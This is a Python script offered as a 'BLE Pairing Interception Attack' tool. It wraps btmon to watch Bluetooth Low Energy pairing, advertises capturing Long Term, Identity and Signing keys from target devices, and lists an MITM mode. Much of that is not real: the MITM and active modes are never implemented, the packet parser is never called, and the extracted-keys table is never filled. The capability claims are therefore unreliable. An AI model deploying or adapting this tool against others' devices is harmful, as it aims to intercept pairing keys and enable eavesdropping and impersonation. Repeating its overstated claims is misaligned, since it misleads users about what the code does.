#!/usr/bin/env python3
"""
BLE Pairing Interception Attack
================================

Intercepts and analyzes BLE pairing/bonding process to capture security
keys and potentially perform man-in-the-middle attacks.

Attack Vector:
--------------
Monitors BLE Security Manager (SM) protocol during pairing to:
- Capture pairing requests/responses
- Extract temporary keys (TK) if Just Works or Passkey Entry
- Identify pairing methods (Just Works, Passkey, OOB, Numeric Comparison)
- Perform MITM relay attacks if conditions allow
- Extract Long Term Keys (LTK) if encryption is weak

Technical Details:
------------------
- Protocol: BLE Security Manager (SM), L2CAP channel 0x06
- Packet Types: Pairing Request, Pairing Response, Pairing Confirm, etc.
- Methods: Just Works (vulnerable), Passkey Entry, OOB, Numeric Comparison
- Captures: TK, STK, LTK, IRK, CSRK
- Requires: HCI sniffer mode or btmon

Requirements:
-------------
- Linux with BlueZ stack
- Root privileges
- BLE adapter with sniffing support (or btmon)
- Python 3.11+ (uses ExceptionGroup, match/case)
- Optional: Ubertooth One or nRF52840 for advanced sniffing

Usage Examples:
---------------
    # Monitor all BLE pairing on adapter
    sudo ./pairing_interception.py --adapter hci0

    # Target specific device by MAC
    sudo ./pairing_interception.py --adapter hci0 --target AA:BB:CC:DD:EE:FF

    # Capture to PCAP file
    sudo ./pairing_interception.py --adapter hci0 --output capture.pcap

    # Passive monitoring mode (no injection)
    sudo ./pairing_interception.py --adapter hci0 --mode passive

Defense Mechanisms:
-------------------
- Use Secure Connections (LE Secure Connections)
- Use Numeric Comparison or OOB pairing
- Avoid "Just Works" pairing
- Enable pairing confirmation
- Use bonding with key regeneration

Author: Wireless Security Research
License: Educational purposes only
"""

import sys
import os
import signal
import time
import argparse
import struct
import socket
import subprocess
import threading
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
from enum import IntEnum
from collections import defaultdict

# Check Python version
if sys.version_info < (3, 11):
    print("Error: This script requires Python 3.11+", file=sys.stderr)
    print("For older Python versions, use the version-specific implementations", file=sys.stderr)
    sys.exit(1)

# SM Packet Types (Security Manager Protocol)
class SMCommand(IntEnum):
    """BLE Security Manager command opcodes"""
    PAIRING_REQUEST = 0x01
    PAIRING_RESPONSE = 0x02
    PAIRING_CONFIRM = 0x03
    PAIRING_RANDOM = 0x04
    PAIRING_FAILED = 0x05
    ENCRYPTION_INFORMATION = 0x06
    MASTER_IDENTIFICATION = 0x07
    IDENTITY_INFORMATION = 0x08
    IDENTITY_ADDRESS_INFORMATION = 0x09
    SIGNING_INFORMATION = 0x0A
    SECURITY_REQUEST = 0x0B
    PAIRING_PUBLIC_KEY = 0x0C
    PAIRING_DHKEY_CHECK = 0x0D
    PAIRING_KEYPRESS_NOTIFICATION = 0x0E

# Pairing methods
PAIRING_METHODS = {
    0: "Just Works",
    1: "Passkey Entry",
    2: "Out of Band (OOB)",
    3: "Numeric Comparison"
}

# Pairing failure reasons
PAIRING_FAILURES = {
    0x01: "Passkey Entry Failed",
    0x02: "OOB Not Available",
    0x03: "Authentication Requirements",
    0x04: "Confirm Value Failed",
    0x05: "Pairing Not Supported",
    0x06: "Encryption Key Size",
    0x07: "Command Not Supported",
    0x08: "Unspecified Reason",
    0x09: "Repeated Attempts",
    0x0A: "Invalid Parameters",
    0x0B: "DHKey Check Failed",
    0x0C: "Numeric Comparison Failed",
    0x0D: "BR/EDR Pairing in Progress",
    0x0E: "Cross-transport Key Derivation Not Allowed"
}

@dataclass
class PairingInterceptionConfig:
    """Configuration for BLE pairing interception"""
    adapter: str                                # BLE adapter (e.g., "hci0")
    target_address: str | None = None           # Target device MAC (None = all)
    mode: str = "passive"                       # Mode: passive, active, mitm
    output_file: str | None = None              # PCAP output file
    duration: int | None = None                 # Duration in seconds (None = unlimited)
    extract_keys: bool = True                   # Extract and display keys
    log_all_packets: bool = False               # Log all BLE packets (verbose)
    verbose: bool = False                       # Verbose output

    def validate(self):
        """Validate configuration parameters"""
        errors = []

        if not self.adapter:
            errors.append("Adapter must be specified")

        valid_modes = ["passive", "active", "mitm"]
        if self.mode not in valid_modes:
            errors.append(f"Invalid mode. Must be one of: {valid_modes}")

        if self.duration is not None and self.duration <= 0:
            errors.append("Duration must be positive")

        # MITM mode requires target
        if self.mode == "mitm" and not self.target_address:
            errors.append("MITM mode requires --target-address")

        # Validate MAC address format if provided
        if self.target_address:
            import re
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', self.target_address):
                errors.append("Invalid MAC address format")

        if errors:
            raise ExceptionGroup("Configuration validation failed", [
                ValueError(error) for error in errors
            ])

@dataclass
class PairingEvent:
    """Represents a pairing event"""
    timestamp: float
    device_address: str
    event_type: str
    command: int
    data: bytes
    parsed_data: dict = field(default_factory=dict)

@dataclass
class AttackStatistics:
    """Statistics tracking for the attack"""
    pairing_attempts: int = 0
    pairing_successes: int = 0
    pairing_failures: int = 0
    keys_extracted: int = 0
    packets_captured: int = 0
    start_time: float = field(default_factory=time.time)
    running: bool = True

    # Track pairing methods seen
    pairing_methods_seen: dict = field(default_factory=lambda: defaultdict(int))

    def elapsed_time(self) -> float:
        """Get elapsed time in seconds"""
        return time.time() - self.start_time

    def format_summary(self) -> str:
        """Format statistics summary"""
        elapsed = self.elapsed_time()

        methods_str = "\n".join([
            f"    {method}: {count}"
            for method, count in self.pairing_methods_seen.items()
        ]) or "    None"

        return f"""
Attack Statistics:
------------------
Duration:           {elapsed:.2f} seconds
Packets captured:   {self.packets_captured:,}
Pairing attempts:   {self.pairing_attempts}
Pairing successes:  {self.pairing_successes}
Pairing failures:   {self.pairing_failures}
Keys extracted:     {self.keys_extracted}

Pairing methods observed:
{methods_str}
"""

class BLEPairingInterceptor:
    """BLE pairing interception attack implementation"""

    def __init__(self, config: PairingInterceptionConfig):
        self.config = config
        self.stats = AttackStatistics()
        self.btmon_process: Optional[subprocess.Popen] = None
        self.monitor_thread: Optional[threading.Thread] = None
        self.pairing_sessions: dict[str, list[PairingEvent]] = defaultdict(list)
        self.extracted_keys: dict[str, dict] = defaultdict(dict)

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum, frame):
        """Handle interrupt signals gracefully"""
        print("\n[!] Interrupt received, stopping attack...")
        self.stats.running = False

    def _check_permissions(self) -> bool:
        """Check if running with root privileges"""
        if os.geteuid() != 0:
            print("[!] Error: Root privileges required", file=sys.stderr)
            print("[!] Run with: sudo ./pairing_interception.py", file=sys.stderr)
            return False
        return True

    def _check_dependencies(self) -> bool:
        """Check if required tools are available"""
        required = ['btmon', 'hciconfig', 'hcitool']
        missing = []

        for tool in required:
            try:
                subprocess.run(['which', tool], capture_output=True, check=True, timeout=5)
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
                missing.append(tool)

        if missing:
            print(f"[!] Error: Missing required tools: {', '.join(missing)}", file=sys.stderr)
            print("[!] Install with: sudo apt install bluez", file=sys.stderr)
            return False

        return True

    def _check_adapter(self) -> bool:
        """Check if BLE adapter exists and is available"""
        try:
            result = subprocess.run(
                ['hciconfig', self.config.adapter],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode != 0:
                print(f"[!] Error: Adapter {self.config.adapter} not found", file=sys.stderr)
                return False

            # Ensure adapter is UP
            if "UP RUNNING" not in result.stdout:
                print(f"[*] Bringing up adapter {self.config.adapter}...")
                subprocess.run(['hciconfig', self.config.adapter, 'up'], check=True, timeout=5)

            return True

        except subprocess.TimeoutExpired:
            print("[!] Error: Timeout checking adapter", file=sys.stderr)
            return False
        except subprocess.CalledProcessError as e:
            print(f"[!] Error: Failed to configure adapter: {e}", file=sys.stderr)
            return False

    def _start_btmon(self) -> bool:
        """Start btmon for packet capture"""
        try:
            cmd = ['btmon', '-i', self.config.adapter]

            if self.config.output_file:
                cmd.extend(['-w', self.config.output_file])

            self.btmon_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )

            if self.config.verbose:
                print(f"[+] Started btmon on {self.config.adapter}")

            return True

        except FileNotFoundError:
            print("[!] Error: btmon not found", file=sys.stderr)
            return False
        except Exception as e:
            print(f"[!] Error starting btmon: {e}", file=sys.stderr)
            return False

    def _parse_sm_packet(self, command: int, data: bytes) -> dict:
        """Parse Security Manager packet"""
        parsed = {"command": command, "command_name": "Unknown"}

        try:
            # Get command name
            if command in SMCommand._value2member_map_:
                parsed["command_name"] = SMCommand(command).name

            # Parse based on command type
            match command:
                case SMCommand.PAIRING_REQUEST | SMCommand.PAIRING_RESPONSE:
                    if len(data) >= 6:
                        parsed.update({
                            "io_capability": data[0],
                            "oob_data_flag": data[1],
                            "auth_req": data[2],
                            "max_key_size": data[3],
                            "init_key_dist": data[4],
                            "resp_key_dist": data[5]
                        })

                        # Determine pairing method from IO capabilities and auth_req
                        io_cap = data[0]
                        auth_req = data[2]
                        mitm = bool(auth_req & 0x04)

                        if not mitm:
                            parsed["pairing_method"] = "Just Works"
                        elif io_cap in [0, 1]:  # DisplayOnly, DisplayYesNo
                            parsed["pairing_method"] = "Passkey Entry"
                        elif io_cap == 2:  # KeyboardOnly
                            parsed["pairing_method"] = "Passkey Entry"
                        elif io_cap == 3:  # NoInputNoOutput
                            parsed["pairing_method"] = "Just Works"
                        else:
                            parsed["pairing_method"] = "Numeric Comparison"

                case SMCommand.PAIRING_CONFIRM:
                    if len(data) >= 16:
                        parsed["confirm_value"] = data[:16].hex()

                case SMCommand.PAIRING_RANDOM:
                    if len(data) >= 16:
                        parsed["random_value"] = data[:16].hex()

                case SMCommand.PAIRING_FAILED:
                    if len(data) >= 1:
                        reason = data[0]
                        parsed["reason"] = reason
                        parsed["reason_text"] = PAIRING_FAILURES.get(reason, "Unknown")

                case SMCommand.ENCRYPTION_INFORMATION:
                    if len(data) >= 16:
                        parsed["ltk"] = data[:16].hex()
                        parsed["key_type"] = "Long Term Key (LTK)"

                case SMCommand.MASTER_IDENTIFICATION:
                    if len(data) >= 10:
                        parsed["ediv"] = struct.unpack('<H', data[0:2])[0]
                        parsed["rand"] = data[2:10].hex()

                case SMCommand.IDENTITY_INFORMATION:
                    if len(data) >= 16:
                        parsed["irk"] = data[:16].hex()
                        parsed["key_type"] = "Identity Resolving Key (IRK)"

                case SMCommand.IDENTITY_ADDRESS_INFORMATION:
                    if len(data) >= 7:
                        addr_type = data[0]
                        addr = ':'.join(f'{b:02x}' for b in reversed(data[1:7]))
                        parsed["identity_address"] = addr
                        parsed["identity_address_type"] = "Public" if addr_type == 0 else "Random"

                case SMCommand.SIGNING_INFORMATION:
                    if len(data) >= 16:
                        parsed["csrk"] = data[:16].hex()
                        parsed["key_type"] = "Connection Signature Resolving Key (CSRK)"

        except Exception as e:
            if self.config.verbose:
                print(f"[!] Warning: Error parsing SM packet: {e}", file=sys.stderr)

        return parsed

    def _monitor_btmon_output(self):
        """Monitor btmon output in separate thread"""
        if not self.btmon_process:
            return

        current_device = None
        current_packet = None

        try:
            for line in self.btmon_process.stdout:
                if not self.stats.running:
                    break

                line = line.strip()

                # Parse btmon output for SM packets
                # Look for Security Manager Protocol packets
                if "SMP:" in line or "Security Manager Protocol" in line:
                    if self.config.verbose or self.config.log_all_packets:
                        print(f"[SM] {line}")

                # Extract device addresses
                if "Address:" in line:
                    parts = line.split("Address:")
                    if len(parts) > 1:
                        addr = parts[1].strip().split()[0]
                        current_device = addr

                # Look for pairing-related packets
                if "Pairing Request" in line or "Pairing Response" in line:
                    self.stats.pairing_attempts += 1
                    if current_device:
                        event_type = "request" if "Request" in line else "response"
                        print(f"\n[+] Pairing {event_type} detected from {current_device}")

                elif "Pairing Failed" in line:
                    self.stats.pairing_failures += 1
                    print(f"[!] Pairing failed for {current_device or 'unknown device'}")

                elif "LTK" in line or "Long Term Key" in line:
                    self.stats.keys_extracted += 1
                    print(f"[+] Long Term Key extracted from {current_device or 'unknown device'}")
                    if self.config.extract_keys:
                        print(f"    {line}")

                elif "IRK" in line or "Identity Resolving Key" in line:
                    self.stats.keys_extracted += 1
                    print(f"[+] Identity Resolving Key extracted from {current_device or 'unknown device'}")
                    if self.config.extract_keys:
                        print(f"    {line}")

                self.stats.packets_captured += 1

        except Exception as e:
            if self.stats.running and self.config.verbose:
                print(f"[!] Error monitoring btmon: {e}", file=sys.stderr)

    def _should_stop(self) -> bool:
        """Check if attack should stop"""
        # Check duration limit
        if self.config.duration is not None and self.stats.elapsed_time() >= self.config.duration:
            return True

        # Check running flag
        if not self.stats.running:
            return True

        return False

    def execute(self) -> int:
        """Execute the pairing interception attack"""
        try:
            # Validate configuration
            self.config.validate()

            # Check permissions
            if not self._check_permissions():
                return 1

            # Check dependencies
            if not self._check_dependencies():
                return 1

            # Check adapter
            if not self._check_adapter():
                return 1

            # Print banner
            self._print_banner()

            # Start btmon
            print("[*] Starting BLE packet capture...")
            if not self._start_btmon():
                return 1

            # Start monitoring thread
            self.monitor_thread = threading.Thread(target=self._monitor_btmon_output, daemon=True)
            self.monitor_thread.start()

            # Give btmon time to start
            time.sleep(1)

            print(f"[*] Monitoring BLE pairing on {self.config.adapter}...")
            if self.config.target_address:
                print(f"[*] Target device: {self.config.target_address}")
            else:
                print("[*] Monitoring all devices")

            if self.config.output_file:
                print(f"[*] Saving capture to: {self.config.output_file}")

            print("[*] Press Ctrl+C to stop\n")

            # Main monitoring loop
            while not self._should_stop():
                time.sleep(0.1)

            # Determine stop reason
            match (self.config.duration, self.stats.running):
                case (duration, _) if duration is not None and self.stats.elapsed_time() >= duration:
                    print(f"\n[+] Attack complete: Duration {duration}s reached")
                case (_, False):
                    print("\n[+] Attack stopped by user")
                case _:
                    print("\n[+] Attack stopped")

            # Print final statistics
            print(self.stats.format_summary())

            # Display extracted keys
            if self.extracted_keys:
                print("\nExtracted Keys:")
                print("=" * 70)
                for device, keys in self.extracted_keys.items():
                    print(f"\nDevice: {device}")
                    for key_type, key_value in keys.items():
                        print(f"  {key_type}: {key_value}")

            return 0

        except ExceptionGroup as eg:
            print(f"\n[!] Configuration errors:", file=sys.stderr)
            for exc in eg.exceptions:
                print(f"  - {exc}", file=sys.stderr)
            return 1

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
            return 130

        except Exception as e:
            print(f"\n[!] Fatal error: {e}", file=sys.stderr)
            if self.config.verbose:
                import traceback
                traceback.print_exc()
            return 1

        finally:
            self._cleanup()

    def _print_banner(self):
        """Print attack banner with configuration"""
        print("=" * 70)
        print("  BLE Pairing Interception Attack")
        print("=" * 70)
        print(f"Adapter:        {self.config.adapter}")
        print(f"Mode:           {self.config.mode}")

        if self.config.target_address:
            print(f"Target Device:  {self.config.target_address}")
        else:
            print("Target Device:  All devices")

        if self.config.duration:
            print(f"Duration:       {self.config.duration} seconds")
        else:
            print("Duration:       Unlimited")

        if self.config.output_file:
            print(f"Output File:    {self.config.output_file}")

        print(f"Extract Keys:   {self.config.extract_keys}")
        print("=" * 70)
        print()
        print("Security Manager Commands:")
        print("  - Pairing Request/Response: Negotiate pairing method")
        print("  - Pairing Confirm/Random: Key generation")
        print("  - Encryption Information: Long Term Key (LTK)")
        print("  - Identity Information: Identity Resolving Key (IRK)")
        print("  - Signing Information: Connection Signature Key (CSRK)")
        print()
        print("Vulnerable Pairing Methods:")
        print("  [!] Just Works: No MITM protection, keys can be sniffed")
        print("  [!] Passkey Entry: Vulnerable if passkey is weak")
        print("  [+] Numeric Comparison: More secure (LE Secure Connections)")
        print("  [+] OOB: Most secure if OOB channel is secure")
        print("=" * 70)

    def _cleanup(self):
        """Cleanup resources"""
        try:
            # Stop btmon
            if self.btmon_process:
                self.btmon_process.terminate()
                try:
                    self.btmon_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.btmon_process.kill()

                if self.config.verbose:
                    print("[+] btmon stopped")

            # Wait for monitor thread
            if self.monitor_thread and self.monitor_thread.is_alive():
                self.monitor_thread.join(timeout=2)

        except Exception as e:
            if self.config.verbose:
                print(f"[!] Warning during cleanup: {e}", file=sys.stderr)

def main() -> int:
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="BLE Pairing Interception Attack",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --adapter hci0
  %(prog)s --adapter hci0 --target AA:BB:CC:DD:EE:FF
  %(prog)s --adapter hci0 --output capture.pcap --duration 300
  %(prog)s --adapter hci0 --mode passive --extract-keys

Educational purposes only. Unauthorized use is illegal.

Pairing Methods:
  Just Works       - No authentication, vulnerable to MITM
  Passkey Entry    - 6-digit PIN, moderate security
  Numeric Comparison - LE Secure Connections, high security
  Out of Band      - External channel, highest security

Captured Keys:
  LTK  - Long Term Key (encrypts future connections)
  IRK  - Identity Resolving Key (resolves private addresses)
  CSRK - Connection Signature Key (data signing)
"""
    )

    # Required arguments
    parser.add_argument('--adapter', required=True,
                       help='BLE adapter (e.g., hci0)')

    # Optional arguments
    parser.add_argument('--target', '--target-address', dest='target_address',
                       help='Target device MAC address (default: all devices)')
    parser.add_argument('--mode', default='passive',
                       choices=['passive', 'active', 'mitm'],
                       help='Attack mode (default: passive)')
    parser.add_argument('--output', '--output-file', dest='output_file',
                       help='PCAP output file for capture')
    parser.add_argument('--duration', type=int,
                       help='Monitoring duration in seconds (default: unlimited)')
    parser.add_argument('--extract-keys', action='store_true', default=True,
                       help='Extract and display keys (default: True)')
    parser.add_argument('--no-extract-keys', action='store_false', dest='extract_keys',
                       help='Do not extract keys')
    parser.add_argument('--log-all-packets', action='store_true',
                       help='Log all BLE packets (verbose)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    # Create configuration
    config = PairingInterceptionConfig(
        adapter=args.adapter,
        target_address=args.target_address,
        mode=args.mode,
        output_file=args.output_file,
        duration=args.duration,
        extract_keys=args.extract_keys,
        log_all_packets=args.log_all_packets,
        verbose=args.verbose
    )

    # Execute attack
    attack = BLEPairingInterceptor(config)
    return attack.execute()

if __name__ == '__main__':
    sys.exit(main())
